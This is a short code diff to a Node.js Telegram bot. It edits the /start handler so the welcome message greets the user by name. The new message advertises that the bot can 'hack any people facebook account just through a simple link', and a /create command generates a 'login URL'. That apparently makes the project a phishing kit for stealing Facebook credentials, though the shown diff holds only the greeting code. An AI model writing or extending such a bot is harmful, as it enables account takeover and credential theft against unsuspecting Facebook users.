@@ -24,8 +24,11 @@ const users = {};
 // Handle /start command
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
+  const firstName = msg.chat.first_name;
+  const lastName = msg.chat.last_name || ''; // Handle cases where last_name might be undefined
   users[chatId] = {}; // Initialize user data
-  const welcomeMessage = 'Welcome to the login bot! \n\nHere are some options:\n/create - Generate the login URL\n/help - Get assistance or information';
+  const fullName = `${firstName} ${lastName}`;
+  const welcomeMessage = `Welcome ${fullName.trim()}!\nYou can use this bot to hack any people facebook account just through a simple link.\nHere are some options:\n/create - Generate the login URL\n/help - Get assistance or information`;
   bot.sendMessage(chatId, welcomeMessage);
 });
 
